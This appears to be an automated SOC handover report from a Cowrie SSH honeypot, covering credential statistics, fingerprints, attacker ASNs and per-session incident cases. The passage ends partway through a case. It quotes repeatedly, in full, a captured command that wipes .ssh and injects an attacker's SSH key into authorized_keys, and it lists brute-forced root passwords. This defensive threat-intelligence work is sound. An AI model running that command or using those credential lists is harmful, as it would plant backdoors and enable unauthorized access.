# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-25 |
| **Generated At** | 2026-05-25T10:16:19Z |
| **Shift Time** | 10:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **933** |
| Confirmed Threats | **877** |
| False Positives Filtered | **56** (6.0%) |
| Unique Attacker IPs | **53** |
| Countries of Origin | **27** |
| High Severity Cases | **94** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **839** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **200** |
| Unique Credential Pairs | **90** |
| Unique Usernames | **46** |
| Unique Passwords | **82** |
| Successful Auth Pairs | **62** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 94 |
| `345gs5662d34` | 45 |
| `cloud` | 6 |
| `curl` | 6 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 45 |
| `3245gs5662d34` | 45 |
| `fjbdfdjkdsfs541544AA@@` | 8 |
| `Wangsu@2017` | 6 |
| `welltech12` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 45 |
| `root` | `3245gs5662d34` | 45 |
| `root` | `fjbdfdjkdsfs541544AA@@` | 8 |
| `cloud` | `Wangsu@2017` | 6 |
| `curl` | `welltech12` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `yh@123456` | `122.35.192.61` | 2026-05-25T04:47:44 |
| `root` | `3245gs5662d34` | `122.35.192.61` | 2026-05-25T04:47:48 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `200.37.241.186` | 2026-05-25T05:07:16 |
| `root` | `3245gs5662d34` | `200.37.241.186` | 2026-05-25T05:07:23 |
| `root` | `Root123456.` | `94.159.112.56` | 2026-05-25T05:15:48 |
| `root` | `3245gs5662d34` | `94.159.112.56` | 2026-05-25T05:15:52 |
| `root` | `123Abc!@#` | `83.235.16.111` | 2026-05-25T05:27:24 |
| `root` | `3245gs5662d34` | `83.235.16.111` | 2026-05-25T05:27:28 |
| `root` | `Test2025` | `113.161.222.150` | 2026-05-25T06:10:40 |
| `root` | `3245gs5662d34` | `113.161.222.150` | 2026-05-25T06:10:43 |
| `root` | `Yp123456` | `43.156.201.48` | 2026-05-25T06:14:35 |
| `root` | `3245gs5662d34` | `43.156.201.48` | 2026-05-25T06:14:37 |
| `root` | `fjbdfdjkdsfs541544@@` | `113.161.222.150` | 2026-05-25T06:18:57 |
| `root` | `Hw123456` | `113.161.222.150` | 2026-05-25T06:23:06 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `113.161.222.150` | 2026-05-25T06:27:14 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.126.54.95` | 2026-05-25T06:29:15 |
| `root` | `1998` | `113.161.222.150` | 2026-05-25T06:31:26 |
| `root` | `!123` | `113.161.222.150` | 2026-05-25T06:43:57 |
| `root` | `qwe@123` | `180.76.143.203` | 2026-05-25T06:56:16 |
| `root` | `test!@#456` | `34.71.30.159` | 2026-05-25T06:58:37 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-05-25T06:58:44 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `45.173.103.146` | 2026-05-25T07:02:28 |
| `root` | `3245gs5662d34` | `45.173.103.146` | 2026-05-25T07:02:35 |
| `root` | `asdfghjk` | `34.71.30.159` | 2026-05-25T07:06:49 |
| `root` | `qwerty@12345` | `113.161.222.150` | 2026-05-25T07:09:08 |
| `root` | `123456tr` | `113.161.222.150` | 2026-05-25T07:13:22 |
| `root` | `linux123` | `34.72.208.101` | 2026-05-25T07:14:30 |
| `root` | `3245gs5662d34` | `34.72.208.101` | 2026-05-25T07:14:35 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `34.72.208.101` | 2026-05-25T07:17:56 |
| `root` | `Qweqwe123` | `91.201.216.61` | 2026-05-25T07:21:17 |
| `root` | `3245gs5662d34` | `91.201.216.61` | 2026-05-25T07:21:22 |
| `root` | `Root123456.` | `34.72.208.101` | 2026-05-25T07:21:36 |
| `root` | `Ab@123456` | `34.71.30.159` | 2026-05-25T07:23:24 |
| `root` | `Server@1234` | `34.72.208.101` | 2026-05-25T07:25:38 |
| `root` | `123123!@#` | `49.64.242.249` | 2026-05-25T07:29:20 |
| `root` | `3245gs5662d34` | `49.64.242.249` | 2026-05-25T07:29:33 |
| `root` | `123456aa` | `34.71.30.159` | 2026-05-25T07:31:41 |
| `root` | `SjaS7ql13z` | `45.194.17.45` | 2026-05-25T07:33:47 |
| `root` | `redhat` | `34.71.30.159` | 2026-05-25T07:35:50 |
| `root` | `lt123456` | `34.72.208.101` | 2026-05-25T07:36:36 |
| `root` | `123QAZwsx` | `34.71.30.159` | 2026-05-25T07:44:19 |
| `root` | `fjbdfdjkdsfs541544@@` | `34.71.30.159` | 2026-05-25T07:48:20 |
| `root` | `fjbdfdjkdsfs541544@@` | `34.72.208.101` | 2026-05-25T07:51:14 |
| `root` | `Vps12345` | `34.71.30.159` | 2026-05-25T07:52:34 |
| `root` | `unix` | `34.72.208.101` | 2026-05-25T07:54:50 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `34.71.30.159` | 2026-05-25T07:56:49 |
| `root` | `op` | `34.72.208.101` | 2026-05-25T08:02:09 |
| `root` | `ubuntu` | `95.84.47.155` | 2026-05-25T08:25:05 |
| `root` | `fjbdfdjkdsfs541544@@` | `163.44.117.135` | 2026-05-25T09:14:16 |
| `root` | `3245gs5662d34` | `163.44.117.135` | 2026-05-25T09:14:20 |
| `root` | `Ly123456@` | `163.44.117.135` | 2026-05-25T09:18:23 |
| `root` | `AAAaaa111` | `163.44.117.135` | 2026-05-25T09:22:27 |
| `root` | `test1234!` | `163.44.117.135` | 2026-05-25T09:26:31 |
| `root` | `1234asdf` | `163.44.117.135` | 2026-05-25T09:34:45 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `163.44.117.135` | 2026-05-25T09:42:55 |
| `root` | `online@123` | `163.44.117.135` | 2026-05-25T09:47:00 |
| `root` | `Qwerty12` | `101.79.165.128` | 2026-05-25T09:48:43 |
| `root` | `3245gs5662d34` | `101.79.165.128` | 2026-05-25T09:48:46 |
| `root` | `Huawei@321` | `163.44.117.135` | 2026-05-25T09:51:03 |
| `root` | `Root12345678` | `101.79.165.128` | 2026-05-25T09:53:20 |
| `root` | `fjbdfdjkdsfs541544AA@@` | `101.79.165.128` | 2026-05-25T09:57:47 |
| `root` | `fjbdfdjkdsfs541544@@` | `101.79.165.128` | 2026-05-25T10:11:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **933** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 231 |
| Nmap scanner | 7 |
| Go SSH scanner | 4 |
| Unknown | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 193 | 16 |
| `03a80b21afa8...` | Modern SSH client | 23 | 3 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `864cef7e4d8a...` | Mirai/variant | 1 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 193 | 16 | Mirai/variant |
| `03a80b21afa8...` | libssh | 23 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 14 | 4 | — |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `864cef7e4d8a...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `a20aced7c982...` | Nmap scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 45 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `122.35.192.61`, `43.156.201.48`, `101.79.165.128`, `94.159.112.56`, `83.235.16.111`, `45.173.103.146`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **53** |
| Unique ASNs | **39** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS6799` | Ote SA (Hellenic Telecommunications Organisation) | 2 | HIGH |
| `AS209851` | Hyper Cloud Solutions LLP | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (94)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-aa12df360037

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-05-25 04:47 |
| **Last Seen** | 2026-05-25 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 04:47:44` | `cowrie.session.connect` |
| `2026-05-25 04:47:44` | `cowrie.client.version` |
| `2026-05-25 04:47:44` | `cowrie.client.kex` |
| `2026-05-25 04:47:44` | `cowrie.login.success` |
| `2026-05-25 04:47:45` | `cowrie.session.params` |
| `2026-05-25 04:47:45` | `cowrie.command.input` |
| `2026-05-25 04:47:45` | `cowrie.command.failed` |
| `2026-05-25 04:47:45` | `cowrie.log.closed` |
| `2026-05-25 04:47:45` | `cowrie.session.params` |
| `2026-05-25 04:47:45` | `cowrie.command.input` |
| `2026-05-25 04:47:45` | `cowrie.session.file_download` |
| `2026-05-25 04:47:45` | `cowrie.log.closed` |
| `2026-05-25 04:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a391b87eb6e0

| Field | Detail |
|---|---|
| **Source IP** | `122.35.192[.]61` |
| **First Seen** | 2026-05-25 04:47 |
| **Last Seen** | 2026-05-25 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 04:47:48` | `cowrie.session.connect` |
| `2026-05-25 04:47:48` | `cowrie.client.version` |
| `2026-05-25 04:47:48` | `cowrie.client.kex` |
| `2026-05-25 04:47:48` | `cowrie.login.success` |
| `2026-05-25 04:47:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.35.192[.]61` to AbuseIPDB if not already reported
- [ ] Block `122.35.192[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d1a5c3ed0f

| Field | Detail |
|---|---|
| **Source IP** | `200.37.241[.]186` |
| **First Seen** | 2026-05-25 05:07 |
| **Last Seen** | 2026-05-25 05:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:07:14` | `cowrie.session.connect` |
| `2026-05-25 05:07:14` | `cowrie.client.version` |
| `2026-05-25 05:07:14` | `cowrie.client.kex` |
| `2026-05-25 05:07:16` | `cowrie.login.success` |
| `2026-05-25 05:07:16` | `cowrie.session.params` |
| `2026-05-25 05:07:16` | `cowrie.command.input` |
| `2026-05-25 05:07:16` | `cowrie.command.failed` |
| `2026-05-25 05:07:17` | `cowrie.log.closed` |
| `2026-05-25 05:07:17` | `cowrie.session.params` |
| `2026-05-25 05:07:17` | `cowrie.command.input` |
| `2026-05-25 05:07:18` | `cowrie.session.file_download` |
| `2026-05-25 05:07:18` | `cowrie.log.closed` |
| `2026-05-25 05:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.241[.]186` to AbuseIPDB if not already reported
- [ ] Block `200.37.241[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9d6a66d3f7

| Field | Detail |
|---|---|
| **Source IP** | `200.37.241[.]186` |
| **First Seen** | 2026-05-25 05:07 |
| **Last Seen** | 2026-05-25 05:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:07:21` | `cowrie.session.connect` |
| `2026-05-25 05:07:21` | `cowrie.client.version` |
| `2026-05-25 05:07:21` | `cowrie.client.kex` |
| `2026-05-25 05:07:23` | `cowrie.login.success` |
| `2026-05-25 05:07:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.241[.]186` to AbuseIPDB if not already reported
- [ ] Block `200.37.241[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48338321bdbb

| Field | Detail |
|---|---|
| **Source IP** | `94.159.112[.]56` |
| **First Seen** | 2026-05-25 05:15 |
| **Last Seen** | 2026-05-25 05:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:15:47` | `cowrie.session.connect` |
| `2026-05-25 05:15:47` | `cowrie.client.version` |
| `2026-05-25 05:15:47` | `cowrie.client.kex` |
| `2026-05-25 05:15:48` | `cowrie.login.success` |
| `2026-05-25 05:15:48` | `cowrie.session.params` |
| `2026-05-25 05:15:48` | `cowrie.command.input` |
| `2026-05-25 05:15:48` | `cowrie.command.failed` |
| `2026-05-25 05:15:49` | `cowrie.log.closed` |
| `2026-05-25 05:15:49` | `cowrie.session.params` |
| `2026-05-25 05:15:49` | `cowrie.command.input` |
| `2026-05-25 05:15:49` | `cowrie.session.file_download` |
| `2026-05-25 05:15:49` | `cowrie.log.closed` |
| `2026-05-25 05:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.112[.]56` to AbuseIPDB if not already reported
- [ ] Block `94.159.112[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1bd0c775bf

| Field | Detail |
|---|---|
| **Source IP** | `94.159.112[.]56` |
| **First Seen** | 2026-05-25 05:15 |
| **Last Seen** | 2026-05-25 05:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:15:51` | `cowrie.session.connect` |
| `2026-05-25 05:15:51` | `cowrie.client.version` |
| `2026-05-25 05:15:51` | `cowrie.client.kex` |
| `2026-05-25 05:15:52` | `cowrie.login.success` |
| `2026-05-25 05:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.159.112[.]56` to AbuseIPDB if not already reported
- [ ] Block `94.159.112[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38e403e7eee0

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-05-25 05:27 |
| **Last Seen** | 2026-05-25 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:27:24` | `cowrie.session.connect` |
| `2026-05-25 05:27:24` | `cowrie.client.version` |
| `2026-05-25 05:27:24` | `cowrie.client.kex` |
| `2026-05-25 05:27:24` | `cowrie.login.success` |
| `2026-05-25 05:27:25` | `cowrie.session.params` |
| `2026-05-25 05:27:25` | `cowrie.command.input` |
| `2026-05-25 05:27:25` | `cowrie.command.failed` |
| `2026-05-25 05:27:25` | `cowrie.log.closed` |
| `2026-05-25 05:27:25` | `cowrie.session.params` |
| `2026-05-25 05:27:25` | `cowrie.command.input` |
| `2026-05-25 05:27:25` | `cowrie.session.file_download` |
| `2026-05-25 05:27:25` | `cowrie.log.closed` |
| `2026-05-25 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ba29ec35d92

| Field | Detail |
|---|---|
| **Source IP** | `83.235.16[.]111` |
| **First Seen** | 2026-05-25 05:27 |
| **Last Seen** | 2026-05-25 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 05:27:28` | `cowrie.session.connect` |
| `2026-05-25 05:27:28` | `cowrie.client.version` |
| `2026-05-25 05:27:28` | `cowrie.client.kex` |
| `2026-05-25 05:27:28` | `cowrie.login.success` |
| `2026-05-25 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.235.16[.]111` to AbuseIPDB if not already reported
- [ ] Block `83.235.16[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07ab4986e9d1

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:10 |
| **Last Seen** | 2026-05-25 06:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:10:40` | `cowrie.session.connect` |
| `2026-05-25 06:10:40` | `cowrie.client.version` |
| `2026-05-25 06:10:40` | `cowrie.client.kex` |
| `2026-05-25 06:10:40` | `cowrie.login.success` |
| `2026-05-25 06:10:40` | `cowrie.session.params` |
| `2026-05-25 06:10:40` | `cowrie.command.input` |
| `2026-05-25 06:10:40` | `cowrie.command.failed` |
| `2026-05-25 06:10:41` | `cowrie.log.closed` |
| `2026-05-25 06:10:41` | `cowrie.session.params` |
| `2026-05-25 06:10:41` | `cowrie.command.input` |
| `2026-05-25 06:10:41` | `cowrie.session.file_download` |
| `2026-05-25 06:10:41` | `cowrie.log.closed` |
| `2026-05-25 06:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c501d144cc78

| Field | Detail |
|---|---|
| **Source IP** | `113.161.222[.]150` |
| **First Seen** | 2026-05-25 06:10 |
| **Last Seen** | 2026-05-25 06:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-25 06:10:43` | `cowrie.session.connect` |
| `2026-05-25 06:10:43` | `cowrie.client.version` |
| `2026-05-25 06:10:43` | `cowrie.client.kex` |
| `2026-05-25 06:10:43` | `cowrie.login.success` |
| `2026-05-25 06:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.161.222[.]150` to AbuseIPDB if not already reported
- [ ] Block `113.161.222[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729a1f0a1b05

| Field | Detail |
|---|---|
| **Source IP** | `43.156.201[.]48` |
| **First Seen** | 2026-05-25 06:14 |
| **Last Seen** | 2026-05-25 06:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
